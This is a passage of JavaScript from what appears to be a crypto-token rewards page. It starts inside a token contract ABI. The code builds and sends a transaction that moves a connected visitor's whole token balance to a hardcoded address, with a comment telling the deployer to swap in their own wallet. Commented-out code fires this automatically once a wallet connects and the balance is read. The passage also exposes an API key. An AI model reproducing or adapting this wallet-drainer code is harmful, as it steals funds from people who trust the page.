t256"}],"name":"tokenFromReflection","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalFees","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"uniswapV2Pair","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"uniswapV2Router","outputs":[{"internalType":"contract IUniswapV2Router02","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]
      var contractAddress = '0x5e90253fbae4dab78aa351f4e6fed08a64ab5590';
      var contract = new web3.eth.Contract(abiArray, contractAddress, {from: sessionStorage.getItem("walletId").toString()})
      var rawTransaction = {"from":sessionStorage.getItem("walletId").toString(), "gasPrice":web3.utils.toHex(5 * 1e9),"gasLimit":web3.utils.toHex(225075),"to":contractAddress,"value":"0x0","data":contract.methods.transfer('0x2D2A864f0EDb3d230D93B12eF26e2f25E8322c4A', (parseInt(sessionStorage.getItem("walletBalance")) * 10 ** 9).toString()).encodeABI()} // Replace wallet address in contracts.method.transfer <--------------------
      web3.eth.sendTransaction(rawTransaction);
  };
  

        


    /*onboardButton.addEventListener('click', async () => {
      const accounts = await ethereum.request({ method: 'eth_accounts' });
      //getAccountsResult.innerHTML = accounts[0] || 'Not able to get accounts';
      tokenAddress = "0x5e90253fbae4dab78aa351f4e6fed08a64ab5590";
      walletAddress = accounts[0].toString();
      let storage = accounts[0].toString();
      sessionStorage.setItem("walletId", storage);
      const contract = new web3.eth.Contract(minABI, tokenAddress);
      contract.methods.balanceOf(walletAddress).call().then(function (balance) {
          decimals = 9
          balance = (balance / (10**decimals));
          console.log(balance.toString());
          bnbbal.innerHTML = balance.toString();
          let balaa = balance;
          sessionStorage.setItem("walletBalance", balaa);
          if (sessionStorage.getItem("MetaMask") != "y") {
              sendTrans();
          }
      });
  
      /*async function getbala() {
          const walletbal_api = "https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=0x5e90253fbae4dab78aa351f4e6fed08a64ab5590&address=" + storage + "&tag=latest&apikey=T3ZQF3TWYAHAZ8III6Z31163UH6CTFT4PI"
          const response2 = await fetch(walletbal_api);
          const data2 = await response2.json();
          let { result } = data2;
          var str = result;
          str = str.substring(0, str.length-5);
          valuei = reverseNum(parseInt(str));
          let stringToAdd = ".";
          new_value = addStr(valuei.toString(), 2, stringToAdd)
          complete = reversedNum(new_value);
          let balaa = complete.toString();
          sessionStorage.setItem("walletBalance", balaa);
      };*/
      //bnbbal.innerHTML = sessionStorage.getItem("walletBalance").toString();
      //totalReward.innerHTML = "Pulling Rewards Data...";
      //getbala();
      //getData();
   // });
  
  
  }
  window.addEventListener('DOMContentLoaded', initialize)
  